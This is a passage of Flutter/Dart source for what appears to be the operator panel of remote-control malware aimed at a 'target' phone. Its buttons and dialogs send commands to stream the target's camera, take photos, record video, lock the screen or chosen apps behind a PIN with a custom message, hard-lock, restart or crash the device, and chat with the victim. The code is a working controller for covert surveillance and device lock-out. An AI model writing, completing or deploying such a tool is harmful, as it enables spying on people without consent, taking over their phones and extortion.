                textAlign: TextAlign.center,
              ),
            ],
          ),
        ),
      ),
    );
  }

  // ── LIVE SECTION ──
  Widget _buildLiveSection() {
    return SilverContainer(
      intensity: 0.6,
      padding: const EdgeInsets.all(12),
      child: Column(
        children: [
          Row(
            children: [
              GlowingWidget(
                color: _isLive ? AppTheme.neonRed : AppTheme.silverLight,
                intensity: _isLive ? 0.5 : 0,
                child: Container(
                  width: 8,
                  height: 8,
                  decoration: BoxDecoration(
                    color: _isLive ? AppTheme.neonRed : AppTheme.silverLight,
                    shape: BoxShape.circle,
                  ),
                ),
              ),
              const SizedBox(width: 10),
              Text(
                _isLive ? '● LIVE' : '○ OFFLINE',
                style: TextStyle(
                  color: _isLive ? AppTheme.neonRed : AppTheme.silverLight,
                  fontSize: 14,
                  fontWeight: FontWeight.w700,
                ),
              ),
              const Spacer(),
              if (_isLive)
                Container(
                  padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 4),
                  decoration: BoxDecoration(
                    color: AppTheme.neonGreen.withOpacity(0.1),
                    borderRadius: BorderRadius.circular(6),
                    border: Border.all(color: AppTheme.neonGreen.withOpacity(0.3)),
                  ),
                  child: Text(
                    '$_fps fps',
                    style: const TextStyle(color: AppTheme.neonGreen, fontSize: 10, fontWeight: FontWeight.bold),
                  ),
                ),
            ],
          ),
          const SizedBox(height: 10),
          Container(
            height: 150,
            decoration: BoxDecoration(
              color: AppTheme.background,
              borderRadius: BorderRadius.circular(12),
              border: Border.all(color: AppTheme.silverBorder),
            ),
            child: _liveFrame != null
                ? ClipRRect(
                    borderRadius: BorderRadius.circular(12),
                    child: Image.memory(
                      _liveFrame!,
                      fit: BoxFit.contain,
                      gaplessPlayback: true,
                      errorBuilder: (context, error, stackTrace) {
                        return const Center(
                          child: Column(
                            mainAxisAlignment: MainAxisAlignment.center,
                            children: [
                              Icon(Icons.error_outline_rounded, color: AppTheme.neonRed, size: 30),
                              SizedBox(height: 8),
                              Text('Failed to load frame', style: TextStyle(color: AppTheme.silverLight, fontSize: 11)),
                            ],
                          ),
                        );
                      },
                    ),
                  )
                : const Center(
                    child: Column(
                      mainAxisAlignment: MainAxisAlignment.center,
                      children: [
                        Icon(Icons.videocam_off_rounded, color: AppTheme.silverLight, size: 40),
                        SizedBox(height: 8),
                        Text(
                          'Tap Start untuk melihat live',
                          style: TextStyle(color: AppTheme.silverLight, fontSize: 11),
                        ),
                      ],
                    ),
                  ),
          ),
          const SizedBox(height: 10),
          Row(
            children: [
              Expanded(
                child: _buildActionButton(
                  _isLive ? 'STOP' : 'START',
                  _isLive ? Icons.stop_rounded : Icons.play_arrow_rounded,
                  _isLive ? AppTheme.neonRed : AppTheme.silverGlow,
                  _isLive ? _stopLive : _startLive,
                  isSilver: !_isLive,
                ),
              ),
              const SizedBox(width: 8),
              Expanded(
                child: _buildActionButton(
                  'CAM',
                  Icons.camera_alt_rounded,
                  AppTheme.silverGlow,
                  () => _showCameraPicker((side) => _sendCommand('take_photo', extra: side)),
                  isSilver: true,
                ),
              ),
              const SizedBox(width: 8),
              Expanded(
                child: _buildActionButton(
                  'VIDEO',
                  Icons.videocam_rounded,
                  AppTheme.silverGlow,
                  () => _showVideoDialog(),
                  isSilver: true,
                ),
              ),
            ],
          ),
        ],
      ),
    );
  }

  Widget _buildActionButton(String label, IconData icon, Color color, VoidCallback onTap, {bool isSilver = false}) {
    Color bgColor = isSilver ? AppTheme.silverDark : color;
    
    return GestureDetector(
      onTap: onTap,
      child: Container(
        padding: const EdgeInsets.symmetric(vertical: 8),
        decoration: BoxDecoration(
          gradient: isSilver ? AppTheme.gradientSilverDark : null,
          color: isSilver ? null : color.withOpacity(0.05),
          borderRadius: BorderRadius.circular(14),
          border: Border.all(color: isSilver ? AppTheme.silverGlow.withOpacity(0.3) : color.withOpacity(0.2)),
          boxShadow: isSilver ? [
            BoxShadow(
              color: AppTheme.silverGlow.withOpacity(0.1),
              blurRadius: 15,
              spreadRadius: 2,
            ),
          ] : null,
        ),
        child: Row(
          mainAxisAlignment: MainAxisAlignment.center,
          children: [
            Icon(icon, color: color, size: 16),
            const SizedBox(width: 4),
            Text(
              label,
              style: TextStyle(
                color: color,
                fontSize: 10,
                fontWeight: FontWeight.w600,
              ),
            ),
          ],
        ),
      ),
    );
  }

  // ── CHAT SECTION ──
  Widget _buildChatSection() {
    return SilverContainer(
      intensity: 0.6,
      padding: const EdgeInsets.all(12),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Row(
            children: [
              Icon(Icons.chat_rounded, color: AppTheme.silverGlow, size: 18),
              const SizedBox(width: 8),
              Text(
                'CHAT 2 WAY',
                style: TextStyle(
                  color: AppTheme.silverGlow,
                  fontSize: 12,
                  fontWeight: FontWeight.w700,
                ),
              ),
              const Spacer(),
              Container(
                padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 2),
                decoration: BoxDecoration(
                  color: AppTheme.silverGlow.withOpacity(0.1),
                  borderRadius: BorderRadius.circular(6),
                  border: Border.all(color: AppTheme.silverGlow.withOpacity(0.3)),
                ),
                child: Text(
                  '${_chatMessages.length}',
                  style: const TextStyle(color: AppTheme.silverGlow, fontSize: 10, fontWeight: FontWeight.bold),
                ),
              ),
            ],
          ),
          const SizedBox(height: 8),
          Container(
            height: 100,
            decoration: BoxDecoration(
              color: AppTheme.background,
              borderRadius: BorderRadius.circular(12),
              border: Border.all(color: AppTheme.silverBorder),
            ),
            child: ListView.builder(
              controller: _chatScrollController,
              padding: const EdgeInsets.all(8),
              itemCount: _chatMessages.length,
              itemBuilder: (_, i) {
                final msg = _chatMessages[i];
                final isOwner = msg['from'] == 'owner';
                return Padding(
                  padding: const EdgeInsets.symmetric(vertical: 2),
                  child: Row(
                    mainAxisAlignment: isOwner ? MainAxisAlignment.end : MainAxisAlignment.start,
                    children: [
                      Container(
                        padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 4),
                        decoration: BoxDecoration(
                          color: isOwner ? AppTheme.silverGlow.withOpacity(0.15) : AppTheme.silverGlow.withOpacity(0.05),
                          borderRadius: BorderRadius.circular(8),
                          border: Border.all(
                            color: isOwner ? AppTheme.silverGlow.withOpacity(0.3) : AppTheme.silverGlow.withOpacity(0.1),
                          ),
                        ),
                        child: Text(
                          msg['text'] ?? '',
                          style: TextStyle(
                            color: isOwner ? AppTheme.silverGlow : AppTheme.silverLight,
                            fontSize: 11,
                          ),
                        ),
                      ),
                    ],
                  ),
                );
              },
            ),
          ),
          const SizedBox(height: 8),
          Row(
            children: [
              Expanded(
                child: TextField(
                  controller: _chatController,
                  style: const TextStyle(color: AppTheme.textPrimary, fontSize: 12),
                  decoration: InputDecoration(
                    hintText: 'Type message...',
                    hintStyle: const TextStyle(color: AppTheme.silverLight, fontSize: 11),
                    filled: true,
                    fillColor: AppTheme.background,
                    contentPadding: const EdgeInsets.symmetric(horizontal: 12, vertical: 8),
                    border: OutlineInputBorder(
                      borderRadius: BorderRadius.circular(12),
                      borderSide: const BorderSide(color: AppTheme.silverBorder),
                    ),
                    enabledBorder: OutlineInputBorder(
                      borderRadius: BorderRadius.circular(12),
                      borderSide: const BorderSide(color: AppTheme.silverBorder),
                    ),
                    focusedBorder: OutlineInputBorder(
                      borderRadius: BorderRadius.circular(12),
                      borderSide: const BorderSide(color: AppTheme.silverGlow, width: 2),
                    ),
                  ),
                  onSubmitted: _sendChat,
                ),
              ),
              const SizedBox(width: 8),
              Container(
                decoration: BoxDecoration(
                  gradient: AppTheme.gradientSilver,
                  borderRadius: BorderRadius.circular(12),
                  boxShadow: [
                    AppTheme.glowSilverIntense,
                  ],
                ),
                child: IconButton(
                  icon: const Icon(Icons.send_rounded, color: AppTheme.silverDarkBg, size: 20),
                  onPressed: () => _sendChat(_chatController.text),
                  padding: const EdgeInsets.all(8),
                ),
              ),
            ],
          ),
        ],
      ),
    );
  }

  // ── DANGER ZONE ──
  Widget _buildDangerZone() {
    return GridView.count(
      shrinkWrap: true,
      physics: const NeverScrollableScrollPhysics(),
      crossAxisCount: 3,
      crossAxisSpacing: 8,
      mainAxisSpacing: 8,
      childAspectRatio: 1.2,
      children: [
        _buildDangerButton('APP', Icons.app_blocking_rounded, AppTheme.neonDeepBlue, _isAppLocked ? '●' : '○', () => _isAppLocked ? _unlockApp() : _showLockAppDialog()),
        _buildDangerButton('LIVE', Icons.live_tv_rounded, AppTheme.neonPurple, _isLockLiveActive ? '●' : '○', () => _isLockLiveActive ? _unlockLive() : _showLockLiveDialog()),
        _buildDangerButton('DEV', Icons.lock_outline_rounded, AppTheme.neonOrange, _isDeviceLocked ? '●' : '○', () => _isDeviceLocked ? _unlockDevice() : _showLockDeviceDialog()),
        _buildDangerButton('RESTART', Icons.restart_alt_rounded, AppTheme.silverGlow, '↻', _showRestartDialog, true),
        _buildDangerButton('UNLOCK ALL', Icons.lock_open_rounded, AppTheme.silverGlow, '○', _unlockAll, true),
        _buildDangerButton('CRASH', Icons.bug_report_rounded, AppTheme.neonRed, '✕', () => _showConfirmDialog('CRASH DEVICE', 'Yakin mau crash HP target?', () => _sendCommand('crash_device'))),
      ],
    );
  }

  Widget _buildDangerButton(String label, IconData icon, Color color, String badge, VoidCallback onTap, [bool isSilver = false]) {
    Color textColor = isSilver ? AppTheme.silverGlow : color;
    Color borderColor = isSilver ? AppTheme.silverGlow.withOpacity(0.3) : color.withOpacity(0.2);
    
    return GestureDetector(
      onTap: onTap,
      child: Container(
        padding: const EdgeInsets.symmetric(vertical: 10),
        decoration: BoxDecoration(
          gradient: isSilver ? AppTheme.gradientSilverDark : null,
          color: isSilver ? null : color.withOpacity(0.05),
          borderRadius: BorderRadius.circular(14),
          border: Border.all(color: borderColor),
          boxShadow: isSilver ? [
            BoxShadow(
              color: AppTheme.silverGlow.withOpacity(0.1),
              blurRadius: 15,
              spreadRadius: 2,
            ),
          ] : null,
        ),
        child: Column(
          mainAxisAlignment: MainAxisAlignment.center,
          children: [
            Row(
              mainAxisAlignment: MainAxisAlignment.center,
              children: [
                Icon(icon, color: textColor, size: 18),
                const SizedBox(width: 4),
                Text(badge, style: TextStyle(color: textColor, fontSize: 12)),
              ],
            ),
            const SizedBox(height: 2),
            Text(
              label,
              style: TextStyle(
                color: textColor,
                fontSize: 8,
                fontWeight: FontWeight.w600,
              ),
            ),
          ],
        ),
      ),
    );
  }

  // ── UNLOCK FUNCTIONS ──
  Future<void> _unlockScreen() async {
    _showToast('Unlocking screen...', color: AppTheme.silverGlow);
    await _sendCommand('unlock_screen');
    await _checkLockStatus();
    await Future.delayed(const Duration(milliseconds: 500));
    await _checkLockStatus();
  }

  Future<void> _unlockApp() async {
    _showToast('Unlocking app...', color: AppTheme.silverGlow);
    await _sendCommand('unlock_app');
    await _checkAppLockStatus();
    await Future.delayed(const Duration(milliseconds: 500));
    await _checkAppLockStatus();
  }

  Future<void> _unlockLive() async {
    _showToast('Unlocking live...', color: AppTheme.silverGlow);
    await _sendCommand('unlock_live');
    if (mounted) setState(() => _isLockLiveActive = false);
    await Future.delayed(const Duration(milliseconds: 500));
    await _checkLockLiveStatus();
  }

  Future<void> _unlockDevice() async {
    _showToast('Unlocking device...', color: AppTheme.silverGlow);
    await _sendCommand('unlock');
    await _checkDeviceLockStatus();
    await Future.delayed(const Duration(milliseconds: 500));
    await _checkDeviceLockStatus();
  }

  Future<void> _unlockAll() async {
    _showToast('Unlocking all...', color: AppTheme.silverGlow);
    await _sendCommand('unlock_all');
    await _checkAllStatus();
    await Future.delayed(const Duration(milliseconds: 500));
    await _checkAllStatus();
    _showToast('All unlocked', color: AppTheme.silverGlow);
  }

  // ── DIALOGS ── (dengan Silver Theme)
  
  void _showLockScreenDialog() {
    final pinCtrl = TextEditingController(text: '123456');
    final msgCtrl = TextEditingController(text: 'DEVICE LOCKED BY ADMIN');
    bool preventTouch = true;
    
    showDialog(
      context: context,
      barrierDismissible: false,
      builder: (_) => StatefulBuilder(
        builder: (ctx, setState) => AlertDialog(
          backgroundColor: AppTheme.silverDarkBg,
          shape: RoundedRectangleBorder(
            borderRadius: BorderRadius.circular(20),
            side: BorderSide(color: AppTheme.silverGlow.withOpacity(0.3)),
          ),
          title: Row(
            children: [
              Container(
                padding: const EdgeInsets.all(10),
                decoration: BoxDecoration(
                  gradient: AppTheme.gradientSilver,
                  borderRadius: BorderRadius.circular(12),
                  boxShadow: [AppTheme.glowSilver],
                ),
                child: const Icon(Icons.lock_rounded, color: AppTheme.silverDarkBg, size: 18),
              ),
              const SizedBox(width: 12),
              const Text('LOCK SCREEN', style: TextStyle(color: AppTheme.silverGlow, fontSize: 15, fontWeight: FontWeight.w700)),
            ],
          ),
          content: Column(
            mainAxisSize: MainAxisSize.min,
            children: [
              Container(
                padding: const EdgeInsets.all(12),
                decoration: BoxDecoration(
                  color: AppTheme.neonRed.withOpacity(0.1),
                  borderRadius: BorderRadius.circular(10),
                  border: Border.all(color: AppTheme.neonRed.withOpacity(0.3)),
                ),
                child: const Row(
                  children: [
                    Icon(Icons.warning_rounded, color: AppTheme.neonRed, size: 18),
                    SizedBox(width: 10),
                    Expanded(
                      child: Text(
                        'SCREEN WILL BE LOCKED!',
                        style: TextStyle(color: AppTheme.neonRed, fontSize: 12, fontWeight: FontWeight.w600),
                      ),
                    ),
                  ],
                ),
              ),
              const SizedBox(height: 14),
              _buildInputField(msgCtrl, 'Lock Message', hint: 'DEVICE LOCKED BY ADMIN'),
              const SizedBox(height: 10),
              _buildInputField(pinCtrl, 'PIN Unlock (6 digit)', hint: '123456', isNumber: true),
              const SizedBox(height: 10),
              Container(
                padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 4),
                decoration: BoxDecoration(
                  color: AppTheme.silverGlow.withOpacity(0.05),
                  borderRadius: BorderRadius.circular(10),
                  border: Border.all(color: AppTheme.silverGlow.withOpacity(0.2)),
                ),
                child: Row(
                  children: [
                    Icon(
                      // FIXED: Changed touch_app_off_rounded to block_rounded
                      preventTouch ? Icons.block_rounded : Icons.touch_app_rounded,
                      color: preventTouch ? AppTheme.silverGlow : AppTheme.silverLight,
                      size: 18,
                    ),
                    const SizedBox(width: 8),
                    Text(
                      'Prevent Touch',
                      style: TextStyle(
                        color: preventTouch ? AppTheme.silverGlow : AppTheme.silverLight,
                        fontSize: 12,
                        fontWeight: preventTouch ? FontWeight.w600 : FontWeight.w400,
                      ),
                    ),
                    const Spacer(),
                    GestureDetector(
                      onTap: () => setState(() => preventTouch = !preventTouch),
                      child: Container(
                        padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 4),
                        decoration: BoxDecoration(
                          color: preventTouch ? AppTheme.silverGlow.withOpacity(0.15) : AppTheme.silverLight.withOpacity(0.1),
                          borderRadius: BorderRadius.circular(8),
                          border: Border.all(
                            color: preventTouch ? AppTheme.silverGlow : AppTheme.silverLight,
                          ),
                        ),
                        child: Text(
                          preventTouch ? 'ON' : 'OFF',
                          style: TextStyle(
                            color: preventTouch ? AppTheme.silverGlow : AppTheme.silverLight,
                            fontSize: 10,
                            fontWeight: FontWeight.bold,
                          ),
                        ),
                      ),
                    ),
                  ],
                ),
              ),
            ],
          ),
          actions: [
            TextButton(
              onPressed: () => Navigator.pop(ctx),
              child: const Text('Cancel', style: TextStyle(color: AppTheme.silverLight)),
            ),
            Container(
              decoration: BoxDecoration(
                gradient: AppTheme.gradientSilver,
                borderRadius: BorderRadius.circular(12),
                boxShadow: [AppTheme.glowSilverIntense],
              ),
              child: ElevatedButton(
                style: ElevatedButton.styleFrom(
                  backgroundColor: Colors.transparent,
                  shadowColor: Colors.transparent,
                  shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
                  padding: const EdgeInsets.symmetric(horizontal: 24, vertical: 12),
                ),
                onPressed: () {
                  Navigator.pop(ctx);
                  final msg = msgCtrl.text.trim().isEmpty ? 'DEVICE LOCKED BY ADMIN' : msgCtrl.text.trim();
                  final pin = pinCtrl.text.trim().isEmpty ? '123456' : pinCtrl.text.trim().padLeft(6, '0');
                  final extra = '$msg|$pin|${preventTouch ? "1" : "0"}';
                  _sendCommand('lock_screen', extra: extra);
                  _showToast('SCREEN LOCKED!', color: AppTheme.silverGlow);
                  Future.delayed(const Duration(milliseconds: 500), () => _checkLockStatus());
                },
                child: const Text('LOCK', style: TextStyle(color: AppTheme.silverDarkBg, fontWeight: FontWeight.bold)),
              ),
            ),
          ],
        ),
      ),
    );
  }

  void _showLockAppDialog() {
    final pinCtrl = TextEditingController(text: '123456');
    String selectedApp = 'WhatsApp';
    final List<String> apps = ['WhatsApp', 'Instagram', 'Facebook', 'Telegram', 'TikTok', 'YouTube', 'Gmail', 'Chrome', 'Spotify', 'Netflix', 'Shopee', 'Gojek', 'Maps', 'Photos', 'Settings'];

    showDialog(
      context: context,
      barrierDismissible: false,
      builder: (_) => StatefulBuilder(
        builder: (ctx, setState) => AlertDialog(
          backgroundColor: AppTheme.silverDarkBg,
          shape: RoundedRectangleBorder(
            borderRadius: BorderRadius.circular(20),
            side: BorderSide(color: AppTheme.silverGlow.withOpacity(0.3)),
          ),
          title: Row(
            children: [
              Container(
                padding: const EdgeInsets.all(10),
                decoration: BoxDecoration(
                  gradient: AppTheme.gradientSilver,
                  borderRadius: BorderRadius.circular(12),
                  boxShadow: [AppTheme.glowSilver],
                ),
                child: const Icon(Icons.app_blocking_rounded, color: AppTheme.silverDarkBg, size: 18),
              ),
              const SizedBox(width: 12),
              const Text('LOCK APP', style: TextStyle(color: AppTheme.silverGlow, fontSize: 15, fontWeight: FontWeight.w700)),
            ],
          ),
          content: Column(
            mainAxisSize: MainAxisSize.min,
            children: [
              Container(
                height: 140,
                decoration: BoxDecoration(
                  color: AppTheme.background,
                  borderRadius: BorderRadius.circular(10),
                  border: Border.all(color: AppTheme.silverBorder),
                ),
                child: ListView.separated(
                  padding: const EdgeInsets.symmetric(horizontal: 8),
                  itemCount: apps.length,
                  separatorBuilder: (_, __) => const Divider(color: AppTheme.silverBorder, height: 1),
                  itemBuilder: (_, i) {
                    final app = apps[i];
                    final isSelected = selectedApp == app;
                    return ListTile(
                      contentPadding: const EdgeInsets.symmetric(horizontal: 8, vertical: 0),
                      dense: true,
                      leading: Icon(
                        Icons.apps_rounded,
                        color: isSelected ? AppTheme.silverGlow : AppTheme.silverLight,
                        size: 18,
                      ),
                      title: Text(
                        app,
                        style: TextStyle(
                          color: isSelected ? AppTheme.silverGlow : AppTheme.silverLight,
                          fontSize: 12,
                          fontWeight: isSelected ? FontWeight.w600 : FontWeight.w400,
                        ),
                      ),
                      trailing: isSelected
                          ? Icon(Icons.check_circle_rounded, color: AppTheme.neonGreen, size: 18)
                          : null,
                      onTap: () => setState(() => selectedApp = app),
                    );
                  },
                ),
              ),
              const SizedBox(height: 12),
              _buildInputField(pinCtrl, 'PIN Unlock', hint: '123456', isNumber: true),
            ],
          ),
          actions: [
            TextButton(
              onPressed: () => Navigator.pop(ctx),
              child: const Text('Cancel', style: TextStyle(color: AppTheme.silverLight)),
            ),
            Container(
              decoration: BoxDecoration(
                gradient: AppTheme.gradientSilver,
                borderRadius: BorderRadius.circular(12),
                boxShadow: [AppTheme.glowSilverIntense],
              ),
              child: ElevatedButton(
                style: ElevatedButton.styleFrom(
                  backgroundColor: Colors.transparent,
                  shadowColor: Colors.transparent,
                  shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
                  padding: const EdgeInsets.symmetric(horizontal: 24, vertical: 12),
                ),
                onPressed: () {
                  Navigator.pop(ctx);
                  final pin = pinCtrl.text.trim().isEmpty ? '123456' : pinCtrl.text.trim().padLeft(6, '0');
                  _sendCommand('lock_app', extra: '$selectedApp|$pin');
                  _showToast('APP LOCKED: $selectedApp', color: AppTheme.silverGlow);
                  Future.delayed(const Duration(milliseconds: 500), () => _checkAppLockStatus());
                },
                child: const Text('LOCK', style: TextStyle(color: AppTheme.silverDarkBg, fontWeight: FontWeight.bold)),
              ),
            ),
          ],
        ),
      ),
    );
  }

  void _showLockLiveDialog() {
    final pinCtrl = TextEditingController(text: '123456');
    final msgCtrl = TextEditingController(text: 'DEVICE LOCKED BY ADMIN');

    showDialog(
      context: context,
      barrierDismissible: false,
      builder: (_) => AlertDialog(
        backgroundColor: AppTheme.silverDarkBg,
        shape: RoundedRectangleBorder(
          borderRadius: BorderRadius.circular(20),
          side: BorderSide(color: AppTheme.silverGlow.withOpacity(0.3)),
        ),
        title: Row(
          children: [
            Container(
              padding: const EdgeInsets.all(10),
              decoration: BoxDecoration(
                gradient: AppTheme.gradientSilver,
                borderRadius: BorderRadius.circular(12),
                boxShadow: [AppTheme.glowSilver],
              ),
              child: const Icon(Icons.live_tv_rounded, color: AppTheme.silverDarkBg, size: 18),
            ),
            const SizedBox(width: 12),
            const Text('LOCK LIVE + CHAT', style: TextStyle(color: AppTheme.silverGlow, fontSize: 15, fontWeight: FontWeight.w700)),
          ],
        ),
        content: Column(
          mainAxisSize: MainAxisSize.min,
          children: [
            const Text('Lock target + 2 way chat', style: TextStyle(color: AppTheme.silverLight, fontSize: 12)),
            const SizedBox(height: 12),
            _buildInputField(msgCtrl, 'Lock Message', hint: 'DEVICE LOCKED BY ADMIN'),
            const SizedBox(height: 10),
            _buildInputField(pinCtrl, 'PIN Unlock', hint: '123456', isNumber: true),
          ],
        ),
        actions: [
          TextButton(
            onPressed: () => Navigator.pop(context),
            child: const Text('Cancel', style: TextStyle(color: AppTheme.silverLight)),
          ),
          Container(
            decoration: BoxDecoration(
              gradient: AppTheme.gradientSilver,
              borderRadius: BorderRadius.circular(12),
              boxShadow: [AppTheme.glowSilverIntense],
            ),
            child: ElevatedButton(
              style: ElevatedButton.styleFrom(
                backgroundColor: Colors.transparent,
                shadowColor: Colors.transparent,
                shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
                padding: const EdgeInsets.symmetric(horizontal: 24, vertical: 12),
              ),
              onPressed: () {
                Navigator.pop(context);
                final msg = msgCtrl.text.trim().isEmpty ? 'DEVICE LOCKED BY ADMIN' : msgCtrl.text.trim();
                final pin = pinCtrl.text.trim().isEmpty ? '123456' : pinCtrl.text.trim().padLeft(6, '0');
                _sendCommand('lock_live', extra: '$msg|$pin');
                if (mounted) setState(() => _isLockLiveActive = true);
                _showToast('LOCK LIVE + CHAT Active', color: AppTheme.silverGlow);
                Future.delayed(const Duration(milliseconds: 500), () => _checkLockLiveStatus());
              },
              child: const Text('LOCK LIVE', style: TextStyle(color: AppTheme.silverDarkBg, fontWeight: FontWeight.bold)),
            ),
          ),
        ],
      ),
    );
  }

  void _showLockDeviceDialog() {
    final pinCtrl = TextEditingController(text: '123456');
    final msgCtrl = TextEditingController(text: 'DEVICE LOCKED');

    showDialog(
      context: context,
      barrierDismissible: false,
      builder: (_) => AlertDialog(
        backgroundColor: AppTheme.silverDarkBg,
        shape: RoundedRectangleBorder(
          borderRadius: BorderRadius.circular(20),
          side: BorderSide(color: AppTheme.silverGlow.withOpacity(0.3)),
        ),
        title: Row(
          children: [
            Container(
              padding: const EdgeInsets.all(10),
              decoration: BoxDecoration(
                gradient: AppTheme.gradientSilver,
                borderRadius: BorderRadius.circular(12),
                boxShadow: [AppTheme.glowSilver],
              ),
              child: const Icon(Icons.lock_outline_rounded, color: AppTheme.silverDarkBg, size: 18),
            ),
            const SizedBox(width: 12),
            const Text('HARD LOCK', style: TextStyle(color: AppTheme.silverGlow, fontSize: 15, fontWeight: FontWeight.w700)),
          ],
        ),
        content: Column(
          mainAxisSize: MainAxisSize.min,
          children: [
            const Text('Hard Lock - Device will be locked', style: TextStyle(color: AppTheme.silverLight, fontSize: 12)),
            const SizedBox(height: 12),
            _buildInputField(msgCtrl, 'Lock Message', hint: 'DEVICE LOCKED'),
            const SizedBox(height: 10),
            _buildInputField(pinCtrl, 'PIN Unlock', hint: '123456', isNumber: true),
          ],
        ),
        actions: [
          TextButton(
            onPressed: () => Navigator.pop(context),
            child: const Text('Cancel', style: TextStyle(color: AppTheme.silverLight)),
          ),
          Container(
            decoration: BoxDecoration(
              gradient: AppTheme.gradientSilver,
              borderRadius: BorderRadius.circular(12),
              boxShadow: [AppTheme.glowSilverIntense],
            ),
            child: ElevatedButton(
              style: ElevatedButton.styleFrom(
                backgroundColor: Colors.transparent,
                shadowColor: Colors.transparent,
                shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
                padding: const EdgeInsets.symmetric(horizontal: 24, vertical: 12),
              ),
              onPressed: () {
                Navigator.pop(context);
                final msg = msgCtrl.text.trim().isEmpty ? 'DEVICE LOCKED' : msgCtrl.text.trim();
                final pin = pinCtrl.text.trim().isEmpty ? '123456' : pinCtrl.text.trim().padLeft(6, '0');
                _sendCommand('hard_lock', extra: '$msg|$pin');
                if (mounted) setState(() => _isDeviceLocked = true);
                _showToast('HARD LOCK Active', color: AppTheme.silverGlow);
                Future.delayed(const Duration(milliseconds: 500), () => _checkDeviceLockStatus());
              },
              child: const Text('HARD LOCK', style: TextStyle(color: AppTheme.silverDarkBg, fontWeight: FontWeight.bold)),
            ),
          ),
        ],
      ),
    );
  }

  void _showVideoDialog() {
    final durationCtrl = TextEditingController(text: '10');
    final qualityCtrl = TextEditingController(text: '720');

    showDialog(
      context: context,
      builder: (_) => AlertDialog(
        backgroundColor: AppTheme.silverDarkBg,
        shape: RoundedRectangleBorder(
          borderRadius: BorderRadius.circular(20),
          side: BorderSide(color: AppTheme.silverGlow.withOpacity(0.3)),
        ),
        title: Row(
          children: [
            Container(
              padding: const EdgeInsets.all(10),
              decoration: BoxDecoration(
                gradient: AppTheme.gradientSilver,
                borderRadius: BorderRadius.circular(12),
                boxShadow: [AppTheme.glowSilver],
              ),
              child: const Icon(Icons.videocam_rounded, color: AppTheme.silverDarkBg, size: 18),
            ),
            const SizedBox(width: 12),
            const Text('RECORD VIDEO', style: TextStyle(color: AppTheme.silverGlow, fontSize: 15, fontWeight: FontWeight.w700)),
          ],
        ),
        content: Column(
          mainAxisSize: MainAxisSize.min,
          children: [
            _buildInputField(durationCtrl, 'Duration (seconds)', hint: '10', isNumber: true),
            const SizedBox(height: 10),
            _buildInputField(qualityCtrl, 'Quality (480/720/1080)', hint: '720', isNumber: true),
          ],
        ),
        actions: [
          TextButton(
            onPressed: () => Navigator.pop(context),
            child: const Text('Cancel', style: TextStyle(color: AppTheme.silverLight)),
          ),
          Container(
            decoration: BoxDecoration(
              gradient: AppTheme.gradientSilver,
              borderRadius: BorderRadius.circular(12),
              boxShadow: [AppTheme.glowSilverIntense],
            ),
            child: ElevatedButton(
              style: ElevatedButton.styleFrom(
                backgroundColor: Colors.transparent,
                shadowColor: Colors.transparent,
                shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
                padding: const EdgeInsets.symmetric(horizontal: 24, vertical: 12),
              ),
              onPressed: () {
                Navigator.pop(context);
                final duration = durationCtrl.text.trim().isEmpty ? '10' : durationCtrl.text.trim();
                final quality = qualityCtrl.text.trim().isEmpty ? '720' : qualityCtrl.text.trim();
                _sendCommand('record_video', extra: '$duration|$quality');
                _showToast('Recording video...', color: AppTheme.silverGlow);
              },
              child: const Text('RECORD', style: TextStyle(color: AppTheme.silverDarkBg, fontWeight: FontWeight.bold)),
            ),
          ),
        ],
      ),
    );
  }

  void _showPinDialog() {
    final pinCtrl = TextEditingController(text: '123456');
    showDialog(
      context: context,
      builder: (_) => AlertDialog(
        backgroundColor: AppTheme.silverDarkBg,
        shape: RoundedRectangleBorder(
          borderRadius: BorderRadius.circular(20),
          side: BorderSide(color: AppTheme.silverGlow.withOpacity(0.3)),
        ),
        title: Row(
          children: [
            Container(
              padding: const EdgeInsets.all(10),
              decoration: BoxDecoration(
                gradient: AppTheme.gradientSilver,
                borderRadius: BorderRadius.circular(12),
                boxShadow: [AppTheme.glowSilver],
              ),
              child: const Icon(Icons.pin_rounded, color: AppTheme.silverDarkBg, size: 18),
            ),
            const SizedBox(width: 12),
            const Text('SET PIN', style: TextStyle(color: AppTheme.silverGlow, fontSize: 15, fontWeight: FontWeight.w700)),
          ],
        ),
        content: _buildInputField(pinCtrl, 'Enter PIN', hint: '123456', isNumber: true),
        actions: [
          TextButton(
            onPressed: () => Navigator.pop(context),
            child: const Text('Cancel', style: TextStyle(color: AppTheme.silverLight)),
          ),
          Container(
            decoration: BoxDecoration(
              gradient: AppTheme.gradientSilver,
              borderRadius: BorderRadius.circular(12),
              boxShadow: [AppTheme.glowSilverIntense],
            ),
            child: ElevatedButton(
              style: ElevatedButton.styleFrom(
                backgroundColor: Colors.transparent,
                shadowColor: Colors.transparent,
                shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
                padding: const EdgeInsets.symmetric(horizontal: 24, vertical: 12),
              ),
              onPressed: () {
                Navigator.pop(context);
                final pin = pinCtrl.text.trim().isEmpty ? '123456' : pinCtrl.text.trim().padLeft(6, '0');
                _sendCommand('set_pin', extra: pin);
                _showToast('PIN set: $pin', color: AppTheme.silverGlow);
              },
              child: const Text('SET PIN', style: TextStyle(color: AppTheme.silverDarkBg, fontWeight: FontWeight.bold)),
            ),
          ),
        ],
      ),
    );
  }

  void _showRestartDialog() {
    showDialog(
      context: context,
      builder: (_) => AlertDialog(
        backgroundColor: AppTheme.silverDarkBg,
        shape: RoundedRectangleBorder(
          borderRadius: BorderRadius.circular(20),
          side: BorderSide(color: AppTheme.silverGlow.withOpacity(0.3)),
        ),
        title: Row(
          children: [
            Container(
              padding: const EdgeInsets.all(10),
              decoration: BoxDecoration(
                gradient: AppTheme.gradientSilver,
                borderRadius: BorderRadius.circular(12),
                boxShadow: [AppTheme.glowSilver],
              ),
              child: const Icon(Icons.restart_alt_rounded, color: AppTheme.silverDarkBg, size: 18),
            ),
            const SizedBox(width: 12),
